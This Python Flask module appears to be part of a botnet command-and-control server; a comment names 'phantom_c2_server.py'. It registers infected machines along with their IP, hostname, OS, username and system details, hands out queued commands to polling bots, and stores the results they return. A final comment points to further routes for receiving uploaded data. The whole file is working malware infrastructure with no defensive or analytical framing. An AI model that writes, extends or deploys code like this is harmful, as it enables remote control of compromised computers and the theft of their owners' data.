import json, secrets, logging
from datetime import datetime
from flask import Blueprint, request, jsonify
from ..extensions import db
from ..models import Bot, Command, SystemInfo
# import other data-upload models as needed

bot_bp = Blueprint("bot", __name__)
log = logging.getLogger(__name__)

# ---------- registration ----------
@bot_bp.post("/register")
def register():
    data = request.json or {}
    bot_id = secrets.token_urlsafe(16)

    bot = Bot(
        id=bot_id,
        ip_address=request.remote_addr,
        hostname=data.get("hostname", "unknown"),
        os_info=data.get("os_info", "unknown"),
        username=data.get("username", "unknown"),
        capabilities=json.dumps(data.get("capabilities", {})),
        session_token=secrets.token_urlsafe(32),
    )
    db.session.add(bot)
    db.session.add(SystemInfo(bot_id=bot_id,
                              system_data=json.dumps(data.get("system_info", {}))))
    db.session.commit()

    return jsonify(
        bot_id=bot_id,
        session_token=bot.session_token,
        server_time=datetime.utcnow().isoformat()
    )

# ---------- poll for command ----------
@bot_bp.get("/command/<bot_id>")
def get_command(bot_id):
    token = request.headers.get("X-Session-Token")
    bot = Bot.query.filter_by(id=bot_id, session_token=token).first()
    if not bot:
        return jsonify(error="Invalid session token"), 401

    bot.last_seen = datetime.utcnow()
    db.session.commit()

    cmd = Command.query.filter_by(bot_id=bot_id, status="pending").first()
    if cmd:
        cmd.status = "running"
        db.session.commit()
        return jsonify(
            id=cmd.id,
            command=cmd.command,
            args=json.loads(cmd.args or "{}")
        )
    return jsonify(status="no_command")

# ---------- submit result ----------
@bot_bp.post("/result/<command_id>")
def submit_result(command_id):
    token = request.headers.get("X-Session-Token")
    data  = request.json or {}

    cmd = Command.query.get(command_id)
    if not cmd:
        return jsonify(error="Command not found"), 404

    bot = Bot.query.filter_by(id=cmd.bot_id, session_token=token).first()
    if not bot:
        return jsonify(error="Invalid session token"), 401

    cmd.status = "completed"
    cmd.result = json.dumps(data.get("result", {}))
    db.session.commit()
    return jsonify(status="success")

# ---------- data-upload endpoints ----------
# Move all /bot/data/* routes from phantom_c2_server.py below this line
# keeping their bodies unmodified, just changing decorators to @bot_bp.post(...)
